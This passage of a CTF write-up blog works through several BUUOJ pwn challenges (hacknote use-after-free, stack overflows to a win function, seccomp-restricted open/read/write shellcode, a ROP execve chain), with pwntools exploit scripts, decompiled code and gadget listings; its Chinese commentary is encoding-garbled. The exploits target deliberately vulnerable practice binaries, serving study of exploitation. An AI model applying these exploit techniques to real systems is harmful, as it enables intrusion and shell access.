class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./hacknote&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29112</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">magic_addr=elf.symbols[<span class="string">&#x27;magic&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span>(<span class="params">size,payload</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Success !&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span>(<span class="params">index</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span>(<span class="params">index</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">add_note(<span class="number">0x20</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">add_note(<span class="number">0x20</span>,<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">add_note(<span class="number">8</span>,p32(magic_addr))</span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x27-picoctf-2018-buffer-overflow-1"><a href="#0x27-picoctf-2018-buffer-overflow-1" class="headerlink" title="0x27.picoctf_2018_buffer overflow 1"></a>0x27.picoctf_2018_buffer overflow 1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  gets(s);</span><br><span class="line">  v0 = get_return_address();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Okay, time to return... Fingers Crossed... Jumping to 0x%x\n&quot;</span>, v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">      <span class="string">&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./PicoCTF_2018_buffer_overflow_1&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27682</span>)</span><br><span class="line">win_add = <span class="number">0x80485CB</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x28</span>+<span class="number">4</span>) + p32(win_add)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x28-pwnable-orw"><a href="#0x28-pwnable-orw" class="headerlink" title="0x28.pwnable_orw"></a>0x28.pwnable_orw</h2><p>æŒºæœ‰æ„æ€çš„ä¸€ä¸ªé¢˜ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec orw </span><br><span class="line">[*] &#x27;/home/gwt/Desktop/orw&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>å¼€äº†canaryã€‚</p><p>è¿™é¢˜å…¶å®å°±æ˜¯å¾€é‡Œé¢å†™shellcodeï¼Œä½†æ˜¯å†™å…¥åˆ°shellcodeæœ‰è¦æ±‚ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  orw_seccomp();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give my your shellcode:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;shellcode, <span class="number">0xC8</span>u);</span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))shellcode)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">orw_seccomp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v1; <span class="comment">// [esp+4h] [ebp-84h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+8h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">96</span>]; <span class="comment">// [esp+Ch] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+6Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  qmemcpy(v3, &amp;unk_8048640, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  v1 = <span class="number">12</span>;</span><br><span class="line">  v2 = v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>  seccomp æ˜¯ secure computing çš„ç¼©å†™ï¼Œå…¶æ˜¯ Linux kernel ä»2.6.23ç‰ˆæœ¬å¼•å…¥çš„ä¸€ç§ç®€æ´çš„ sandboxing æœºåˆ¶ã€‚åœ¨ Linux ç³»ç»Ÿé‡Œï¼Œå¤§é‡çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆsystem callï¼‰ç›´æ¥æš´éœ²ç»™ç”¨æˆ·æ€ç¨‹åºã€‚ä½†æ˜¯ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„ç³»ç»Ÿè°ƒç”¨éƒ½è¢«éœ€è¦ï¼Œè€Œä¸”ä¸å®‰å…¨çš„ä»£ç æ»¥ç”¨ç³»ç»Ÿè°ƒç”¨ä¼šå¯¹ç³»ç»Ÿé€ æˆå®‰å…¨å¨èƒã€‚</p><p>  seccompå®‰å…¨æœºåˆ¶èƒ½ä½¿ä¸€ä¸ªè¿›ç¨‹è¿›å…¥åˆ°ä¸€ç§â€œå®‰å…¨â€è¿è¡Œæ¨¡å¼ï¼Œè¯¥æ¨¡å¼ä¸‹çš„è¿›ç¨‹åªèƒ½è°ƒç”¨4ç§ç³»ç»Ÿè°ƒç”¨ï¼ˆsystem callï¼‰ï¼Œå³ read(), write(), exit() å’Œ sigreturn()ï¼Œå¦åˆ™è¿›ç¨‹ä¾¿ä¼šè¢«ç»ˆæ­¢ã€‚</p></blockquote><p>æ‰§è¡Œäº†ä¸¤æ¬¡prctlå‡½æ•°ã€‚</p><blockquote><p>  ç¬¬ä¸€æ¬¡è°ƒç”¨prctlå‡½æ•° â€”â€”â€”â€”ç¦æ­¢ææƒ </p><p>  ç¬¬äºŒæ¬¡è°ƒç”¨prctlå‡½æ•° â€”â€”â€”â€”é™åˆ¶èƒ½æ‰§è¡Œçš„ç³»ç»Ÿè°ƒç”¨åªæœ‰openï¼Œwriteï¼Œexit</p></blockquote><p>é‚£ä¹ˆå°±æ˜¯ï¼Œæ‰“å¼€æ–‡ä»¶ï¼Œè¯»flagæ–‡ä»¶ï¼Œç„¶åè¾“å‡ºflagæ–‡ä»¶å†…å®¹ã€‚</p><ul><li>  æ‰“å¼€flagï¼Œsys_open(file,0,0)ï¼Œç³»ç»Ÿè°ƒç”¨å·ä¸º5</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push 0x0#å­—ç¬¦ä¸²ç»“å°¾</span><br><span class="line">push 0x67616c66 #flag</span><br><span class="line">mov ebx,esp</span><br><span class="line">xor ecx,ecx#0</span><br><span class="line">xor edx,edx#0</span><br><span class="line">mov eax,0x5</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><ul><li>  è¯»æ–‡ä»¶ï¼Œsys_read(fd=3,file,0x30)ï¼Œç³»ç»Ÿè°ƒç”¨å·ä¸º3</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov eax,0x3</span><br><span class="line">mov ecx,ebx</span><br><span class="line">mov ebx,0x3  #fd</span><br><span class="line">mov edx,0x30</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><ul><li>  è¾“å‡ºï¼Œsys_write(1,file,0x30)ï¼Œç³»ç»Ÿè°ƒç”¨å·ä¸º4</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax,0x4</span><br><span class="line">mov ebx,0x1</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = remote(&quot;node3.buuoj.cn&quot;, 27008)</span></span><br><span class="line">io = process(<span class="string">&quot;./orw&quot;</span>)</span><br><span class="line">shellcode = asm(<span class="string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;shellcode:&#x27;</span>, shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x29-wustctf2020-getshell"><a href="#0x29-wustctf2020-getshell" class="headerlink" title="0x29.wustctf2020_getshell"></a>0x29.wustctf2020_getshell</h2><p>ä¸€ä¸ªæ°´é¢˜ã€‚</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./wustctf2020_getshell&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27728</span>)</span><br><span class="line">back_door = <span class="number">0x0804851B</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(back_door)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x2A-cmcc-simplerop"><a href="#0x2A-cmcc-simplerop" class="headerlink" title="0x2A.cmcc_simplerop"></a>0x2A.cmcc_simplerop</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ file simplerop </span><br><span class="line">simplerop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=bdd40d725b490b97d5a25857a6273870c7de399f, not stripped</span><br><span class="line">gwt@ubuntu:~/Desktop$ checksec simplerop </span><br><span class="line">[*] &#x27;/home/gwt/Desktop/simplerop&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">gwt@ubuntu:~/Desktop$ </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-14h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ROP is easy is&#x27;nt it ?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your input :&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;v4, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>idaæ˜¾ç¤ºåç§»æ˜¯0x14ï¼Œå¯ä»¥è°ƒè¯•ä¸‹ã€‚</p><p>ä½¿ç”¨cyclicç”Ÿæˆä¸€äº›æµ‹è¯•çš„å­—ç¬¦ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~$ cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºåç§»ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGSEGV (fault address 0x61616169)</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> cyclic -l 0x61616169</span></span><br><span class="line">32</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> </span></span><br></pre></td></tr></table></figure><p>æ˜¯32 ï¼Œä¹Ÿå°±æ˜¯0x20ï¼Œï¼ˆè¿™é‡Œidaå‡ºäº†é—®é¢˜ï¼‰</p><p>å­˜åœ¨int 0x80 ä¸­æ–­æŒ‡ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ ROPgadget --binary simplerop --ropchain | grep &#x27;int 0x80&#x27;</span><br><span class="line">0x08093b43 : add bh, al ; inc ebp ; test byte ptr [ecx], dl ; add byte ptr [eax], al ; int 0x80</span><br><span class="line">0x080493df : add byte ptr [eax], al ; int 0x80</span><br><span class="line">0x08092190 : add byte ptr [eax], al ; mov eax, edi ; mov ecx, 0x81 ; int 0x80</span><br><span class="line">0x08092191 : add byte ptr [ecx + 0x81b9f8], cl ; add byte ptr [eax], al ; int 0x80</span><br><span class="line">0x0806c421 : add dword ptr [eax], eax ; add byte ptr [eax], al ; int 0x80</span><br><span class="line">0x0806e908 : clc ; mov ecx, 0x80 ; int 0x80</span><br><span class="line">0x08092193 : clc ; mov ecx, 0x81 ; int 0x80</span><br><span class="line">0x08093b45 : inc ebp ; test byte ptr [ecx], dl ; add byte ptr [eax], al ; int 0x80</span><br><span class="line">0x080493e1 : int 0x80</span><br><span class="line">0x0807b3ea : ja 0x807b3f0 ; add byte ptr [eax], al ; int 0x80</span><br><span class="line">0x080b9851 : jp 0x80b985a ; int 0x80</span><br><span class="line">0x080b9a77 : jp 0x80b9a81 ; int 0x80</span><br><span class="line">0x08093b44 : mov dword ptr [ebp - 0x7c], 0x51 ; int 0x80</span><br><span class="line">0x080493d9 : mov dword ptr [esp + 0x2c], 0x51 ; int 0x80</span><br><span class="line">0x0807b3e9 : mov eax, 0x77 ; int 0x80</span><br><span class="line">0x0807b3e0 : mov eax, 0xad ; int 0x80</span><br><span class="line">0x0806c420 : mov eax, 1 ; int 0x80</span><br><span class="line">0x0806e907 : mov eax, edi ; mov ecx, 0x80 ; int 0x80</span><br><span class="line">0x08092192 : mov eax, edi ; mov ecx, 0x81 ; int 0x80</span><br><span class="line">0x0806e909 : mov ecx, 0x80 ; int 0x80</span><br><span class="line">0x08092194 : mov ecx, 0x81 ; int 0x80</span><br><span class="line">0x0806eeef : nop ; int 0x80</span><br><span class="line">0x0807b3df : nop ; mov eax, 0xad ; int 0x80</span><br><span class="line">0x0806eeee : nop ; nop ; int 0x80</span><br><span class="line">0x0807b3de : nop ; nop ; mov eax, 0xad ; int 0x80</span><br><span class="line">0x0806eeec : nop ; nop ; nop ; int 0x80</span><br><span class="line">0x0807b3dc : nop ; nop ; nop ; mov eax, 0xad ; int 0x80</span><br><span class="line">0x0806eeea : nop ; nop ; nop ; nop ; int 0x80</span><br><span class="line">0x0806eee8 : nop ; nop ; nop ; nop ; nop ; int 0x80</span><br><span class="line">0x0807b3e7 : nop ; pop eax ; mov eax, 0x77 ; int 0x80</span><br><span class="line">0x0806c41f : or byte ptr [eax + 1], bh ; int 0x80</span><br><span class="line">0x0807b3e8 : pop eax ; mov eax, 0x77 ; int 0x80</span><br><span class="line">0x0806c41e : push cs ; or byte ptr [eax + 1], bh ; int 0x80</span><br><span class="line">0x080b9a78 : push es ; int 0x80</span><br><span class="line">0x08093b42 : sldt edi ; inc ebp ; test byte ptr [ecx], dl ; add byte ptr [eax], al ; int 0x80</span><br><span class="line">0x08093b46 : test byte ptr [ecx], dl ; add byte ptr [eax], al ; int 0x80</span><br><span class="line">0x0806e905 : xor esi, esi ; mov eax, edi ; mov ecx, 0x80 ; int 0x80</span><br><span class="line">[+] Gadget found: 0x80493e1 int 0x80</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080493e1) # int 0x80</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æˆ–è€…ï¼š</span><br><span class="line">gwt@ubuntu:~/Desktop$ ROPgadget --binary simplerop --only &quot;pop|ret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0809da92 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0807bf7d : pop ds ; ret</span><br><span class="line">0x0809da8a : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bae06 : pop eax ; ret</span><br><span class="line">0x08071e3a : pop eax ; ret 0x80e</span><br><span class="line">0x0805b3ad : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809de85 : pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x0804838e : pop ebp ; ret</span><br><span class="line">0x080a96e5 : pop ebp ; ret 0x10</span><br><span class="line">0x080966d9 : pop ebp ; ret 0x14</span><br><span class="line">0x08070a36 : pop ebp ; ret 0xc</span><br><span class="line">0x0805ab34 : pop ebp ; ret 4</span><br><span class="line">0x08049bc0 : pop ebp ; ret 8</span><br><span class="line">0x0809de84 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bd793 : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806e829 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08091f08 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a96e2 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x080966d6 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070a33 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x0805ab31 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bbd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080499d9 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a54 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d797c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099937 : pop ebx ; ret 8</span><br><span class="line">0x0806e851 : pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>å­˜åœ¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x080bae06 : pop eax ; ret</span><br><span class="line">0x0806e850 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>ç³»ç»Ÿè°ƒç”¨ï¼šint80(11,â€/bin/shâ€,null,null)ï¼Œå…¶ä¸­åé¢çš„å››ä¸ªå‚æ•°åˆ†åˆ«æ˜¯eax,ebx,ecx,edxã€‚</p><p>ä½†æ˜¯æ²¡æœ‰/bin/shå­—ç¬¦ä¸²ï¼Œéœ€è¦è¾“å…¥ï¼Œæœ‰readå‡½æ•°ï¼Œå°†binshå†™å…¥bssæ®µï¼Œç„¶åç›´æ¥è°ƒç”¨ï¼Œè¿™é¢˜æ²¡æœ‰å¼€PIEï¼Œbssçš„åœ°å€å°±æ˜¯ç»å¯¹åœ°å€ã€‚</p><p>ebxï¼šæ–‡ä»¶æè¿°ç¬¦</p><p>ecxï¼šæŒ‡å‘è¦å†™å…¥çš„å­—ç¬¦ä¸²çš„æŒ‡é’ˆ</p><p>edxï¼šè¦å†™å…¥çš„å­—ç¬¦ä¸²é•¿åº¦</p><p>payloadï¼š</p><p><code>payload = &#39;a&#39;\*0x20 + p32(read_addr) + p32(pop_edcbx) + p32(0) + p32(binsh_addr) + p32(0x8)</code><br><code>payload += p32(pop_eax) + p32(0xb) + p32(pop_edcbx) + p32(0) +p32(0) + p32(binsh_addr) + p32(int_addr)</code></p><p>Expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 